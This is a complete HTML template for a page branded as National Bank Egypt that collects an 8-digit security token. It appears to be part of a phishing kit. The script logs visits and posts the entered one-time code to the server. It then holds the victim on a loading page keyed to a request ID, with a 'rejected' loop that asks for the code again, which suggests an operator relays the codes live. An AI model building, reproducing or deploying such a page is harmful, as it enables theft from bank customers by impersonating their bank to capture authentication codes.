<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Bank Egypt - Token 1</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='login-theme.css') }}">
    <style>
        body { background: rgba(0, 107, 79, 0.16); }
        .token-digit {
            width: 34px;
            height: 42px;
            padding: 0;
            border: 1px solid #cbd5e0;
            border-radius: 6px;
            background: #fff;
            color: #333;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
        }
        .token-digit:focus {
            outline: none;
            border-color: #006b4f;
            box-shadow: 0 0 0 2px rgba(0, 107, 79, 0.15);
        }
        .token-digit.invalid {
            border-color: #d32f2f;
            background: #ffebee;
        }
        .token-error {
            color: #d32f2f;
            font-weight: 700;
            text-align: center;
            margin-bottom: 12px;
        }
    </style>
</head>
<body>

<header class="site-header">
    <div class="header-right">
        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="National Bank Egypt">
    </div>
    <div class="header-left">
        <a href="token1.html" class="lang-switcher">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
            <span>العربية</span>
        </a>
        <a href="password_en.html" style="color: #888; margin-left: 10px; font-size: 20px;"><i class="fas fa-chevron-left"></i></a>
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <section class="login-card">
            <form id="tokenForm">
                <img src="https://i.ibb.co/P04sMTp/file-00000000531c8246a6d5ed35f5660736.png" alt="Token verification instructions" style="display: block; width: 100vw; max-width: none; height: auto; margin: 0 calc(50% - 50vw) 20px; background: var(--bg-gray); mix-blend-mode: multiply; border-radius: 8px;">
                <div id="errorMessage" class="token-error" role="alert" style="display:none;">The code is incorrect or invalid</div>
                <label style="display: block; text-align: center; color: #333; font-weight: bold; margin-bottom: 12px;">Enter the 8-digit code</label>
                <div class="form-group">
                    <div id="tokenDigits" style="display: flex; direction: ltr; justify-content: center; gap: 7px; margin-bottom: 10px;">
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 1" required autofocus>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 2" required>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 3" required>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 4" required>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 5" required>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 6" required>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 7" required>
                        <input type="tel" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Digit 8" required>
                    </div>
                    <input type="hidden" id="token_code" name="token_code">
                </div>

                <div style="text-align: left; margin-bottom: 20px;">
                    <a href="#" style="color: #006b4f; text-decoration: underline; font-size: 14px; font-weight: bold;">Resend code?</a>
                </div>

                <div class="submit-actions">
                    <button type="submit" class="submit-btn" id="submitBtn">Confirm Token</button>
                </div>
            </form>
        </section>
    </div>
</main>

<script>
fetch('/track_visit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action: 'track_visit', page: 'token1_en' })
}).catch(e => console.error(e));

const tokenDigits = Array.from(document.querySelectorAll(".token-digit"));
tokenDigits.forEach((input, index) => {
    input.addEventListener("input", function() {
        this.value = this.value.replace(/[^0-9]/g, "").slice(-1);
        if (this.value && index < tokenDigits.length - 1) tokenDigits[index + 1].focus();
    });
    input.addEventListener("keydown", function(event) {
        if (event.key === "Backspace" && !this.value && index > 0) tokenDigits[index - 1].focus();
    });
});

document.getElementById("tokenForm").addEventListener("submit", async function(event) {
    event.preventDefault();
    const tokenCode = tokenDigits.map(input => input.value).join("");
    document.getElementById("token_code").value = tokenCode;
    const btn = document.getElementById("submitBtn");
    const errorMessageDiv = document.getElementById("errorMessage");

    btn.disabled = true;
    btn.innerText = "Processing...";

    try {
        const response = await fetch("/submit_request", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                type: "otp",
                data: { otp_code: tokenCode, token1_code: tokenCode }
            })
        });

        const result = await response.json();
        if (result.status === "pending" || result.status === "approved") {
            localStorage.setItem("request_id", result.request_id);
            window.location.href = "otp_loading_en.html?request_id=" + result.request_id + "&return_page=token1_en.html";
        } else {
            errorMessageDiv.textContent = result.message || "The code is incorrect";
            errorMessageDiv.style.display = "block";
            btn.disabled = false;
            btn.innerText = "Confirm Token";
        }
    } catch (error) {
        errorMessageDiv.textContent = "A connection error occurred";
        errorMessageDiv.style.display = "block";
        btn.disabled = false;
        btn.innerText = "Confirm Token";
    }
});

const urlParams = new URLSearchParams(window.location.search);
if (urlParams.get("rejected") === "true") {
    const errorDiv = document.getElementById("errorMessage");
    errorDiv.textContent = "The code entered is incorrect. Please try again";
    errorDiv.style.display = "block";
    tokenDigits.forEach(input => input.classList.add("invalid"));
}
</script>
</body>
</html>
